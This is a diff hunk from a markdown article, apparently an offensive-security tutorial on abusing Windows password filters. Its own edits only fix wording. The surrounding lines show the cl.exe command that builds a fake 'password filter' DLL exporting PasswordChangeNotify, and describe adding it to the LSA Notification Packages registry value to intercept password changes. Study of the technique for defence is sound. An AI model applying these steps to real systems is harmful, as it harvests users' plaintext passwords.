@@ -96,13 +96,13 @@ EXPORTS
   PasswordChangeNotify
 ```
 
-Finally, to create our DLL we can compile those two as such:
+Finally, to create our DLL, we can compile those two as such:
 
 ```shell
 cl.exe /W0 /D_USRDLL /D_WINDLL filter.cpp filter.def /MT /link /DLL /OUT:filter.dll
 ```
 
-Then, to register this fake "password filter" we need to change the `Notification Packages` entry in the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` registry key to contain the name of our DLL. But first, let's see the current value of the aforementioned entry:
+Then, to register this fake "password filter" we need to add the name of our DLL to the  `Notification Packages` entry in the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa` registry key. But first, let's see the current value of the aforementioned entry:
 
 ```shell
 reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v "Notification Packages" 
